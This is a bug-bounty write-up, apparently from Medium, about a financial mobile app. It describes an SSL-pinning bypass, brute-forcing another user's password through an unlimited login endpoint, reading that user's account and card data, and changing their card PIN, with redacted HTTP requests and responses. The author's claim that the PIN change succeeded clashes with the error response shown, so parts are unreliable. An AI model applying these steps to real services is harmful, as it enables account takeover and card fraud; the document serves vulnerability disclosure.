# Pre-Account Takeover Leading To Broken Access Control

- **Source URL:** https://medium.com/@bcarikci-dev/pre-account-takeover-leading-to-broken-access-control-13916ca02483?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@bcarikci-dev
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 5418)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Greetings everyone. Today I would like to tell you about my article about the pre-account takeover vulnerability, which I detected in a mobile application penetration test study and verified by taking advantage of the Broken Access Control vulnerability, and the details of the vulnerability. First of all, let’s start with the detection phase of the vulnerability. The existing vulnerability started with the determination that it entered a timeout process if the application was not processed for a few minutes. When a brute force attack was made on the password of any of the existing users in this area, their password was verified and several different transactions were performed with the information obtained after this stage. Let’s look at the details together.

### **Exploration Stage**

By performing the procedures we did during routine test checks, I first installed the application and bypassed the SSL Pinning stage with the help of a frida. Later, I tried to make different discoveries by examining certain requests through burp. After this stage, I got up from the computer to take a break and when I came back, I noticed that the application timeouted to my account.

At this stage, it occurred to me to send a request to log in again, and I started to review the request.

HTTP Request

POST /v1/Account/VerifyPersonalAccount HTTP/1.1

Host: \*\*\*\*\*\*\*\*\*\*

Authorization: Bearer eyJhb\*\*\*\*\*\*\*\*\*\*bA

Locale: tr\_TR

Content-Type: application/json; charset=UTF-8

Content-Length: 77

Accept-Encoding: gzip, deflate, br

User-Agent: okhttp/4.9.0

Connection: close

{"password":"\*\*\*\*\*","phone\_country\_number":"90","phone\_number":"\*\*\*\*\*\*\*\*\*\*"}

There was no authorization check on this request. In other words, there was no control such as which user wants to access which user’s account and whether they have the appropriate authorizations. In the response section, there was information belonging to the user and containing highly sensitive data.

HTTP Response

HTTP/1.1 200 OK

content-length: 735

content-type: application/json

server: Microsoft-IIS/10.0

x-powered-by: \[ASP.NET\](http://asp.net/)

date: Tue, 27 Feb 2024 12:16:04 GMT

connection: close

{"status":0,"code":"100","message":"İşlem Başarılı","payload":{"tenant\_id":"\*\*\*\*\*\*\*\*","user\_id":"\*\*\*\*\*\*\*\*","account\_type":1,"user\_number":"\*\*\*\*\*\*\*","email":"\*\*\*\*\*\*\*\*","security\_image\_id":3,"security\_image":"/images/sc\_3.png","reset\_password\_required":false,"phone\_number":null,"password\_hash":"\*\*\*\*\*\*\*\*\*","lock\_out\_enabled":false,"lockout\_end":null,"access\_failed\_count":0,"status":0,"access\_level\_status":1,"account\_number":"\*\*\*\*\*\*\*\*\*\*","password\_expire\_date":null,"user\_status":0,"last\_login\_date\_time\_utc":"2024-02-27T11:57:17.5882127+00:00","created\_date\_time\_utc":"2023-08-04T15:15:04.3419358+00:00"}}

As you have noticed, there is no control at this stage in the application, the only existing authorization control is the JWT token. When I tried a few different passwords, I did not encounter any error messages or CAPTCHA check. This revived the idea that I could make a request for a different user. Aaaand of course I was right. I could query for different users through this request.

### Pre-Account Takeover

After this stage, I started an Intruder Attack on a different user’s phone number Burp Suite. This attack lasted approximately 2 hours, and as a result of these two hours, I reached the user’s password.

In the returned response, I found very sensitive information about the user and continued my explorations after this stage. Another area on the application was the account activity section, and all of the queries made in this area depended on the account\_number parameter. After seeing my own request, I wanted to check the account activity section for the user whose password I found.

The result was successful. I could see the user’s account number and account activity and card information. At this stage, a different point caught my attention. The card number was not fully encrypted. Only a small fraction of the 16-digit card number was encrypted, and in transactions with the other card number, this card number was processed in this way. Part 1 contained the store where the purchase was made, and part 2 contained the card number where the purchase was made.

In order to verify that the card number was kept as I thought, I wanted to make a transaction through my own card number and came to the area of changing the card password. I confirmed that I was right, the card number was going in exactly the same way, partially and in an inadequately encrypted form.

HTTP Request

POST /v1/Account/UpdateCardPin HTTP/1.1

Host: \*\*\*\*\*\*\*\*\*\*\*\*\*

Authorization: Bearer eyJ\*\*\*\*\*\*\*\*\*\*\*\*\*\*1bA

Locale: tr\_TR

Content-Type: application/json; charset=UTF-8

Content-Length: 64

Accept-Encoding: gzip, deflate, br

User-Agent: okhttp/4.9.0

Connection: close

{"card\_no":"5\*\*\*\*\*bmnnn\*\*\*\*\*\*6","new\_pin":"\*\*\*\*","old\_pin":"\*\*\*\*"}

(Note: I put the stars in the card number on the request. Normally, the only encrypted part of the card number is the letter part.)

HTTP Response

HTTP/1.1 200 OK

content-length: 54

content-type: application/json

server: Microsoft-IIS/10.0

x-powered-by: \[ASP.NET\](http://asp.net/)

date: Tue, 27 Feb 2024 13:07:37 GMT

connection: close

{"status":0,"code":null,"message":null,"payload":true}

In this step, I wanted to make a transaction on the card number I obtained and belonging to a different user. Aaaand the operations I did were successful. I repeated the transactions on the card number belonging to another user and was successful. In this way, I changed the card password of a user independent of myself.

You can check the request below to see it verified.

HTTP Request

POST /v1/Account/UpdateCardPin HTTP/1.1

Host: \*\*\*\*\*\*\*\*\*\*\*\*\*\*

Authorization: Bearer eyJ\*\*\*\*\*\*\*\*\*\*bA

Locale: tr\_TR

Content-Type: application/json; charset=UTF-8

Content-Length: 64

Accept-Encoding: gzip, deflate, br

User-Agent: okhttp/4.9.0

Connection: close

{"card\_no":"5\*\*\*\*\*bmnnnl\*\*\*\*6","new\_pin":"\*\*\*\*","old\_pin":"\*\*\*\*\*"}

HTTP Response

HTTP/1.1 200 OK

content-length: 89

content-type: application/json

server: Microsoft-IIS/10.0

x-powered-by: \[ASP.NET\](http://asp.net/)

date: Tue, 27 Feb 2024 13:21:33 GMT

connection: close

{"status":2,"code":"404","message":"Mevcut şifrenizi yanlış girdiniz","payload":false}

### Conclusion

As a result, I obtained the unique and special information of the user and changed both the card password and the location of the place where he lived when I analyzed the account activities in detail. Such vulnerabilities become a very high risk for the user if necessary precautions are not taken. In test automation processes and back-end controls, the authorizations in these parts should be given the necessary attention and controls should be provided. Attention should be paid to the use of JWT tokens and the authorizations for the end user. Thank you for reading. Happy Hack.
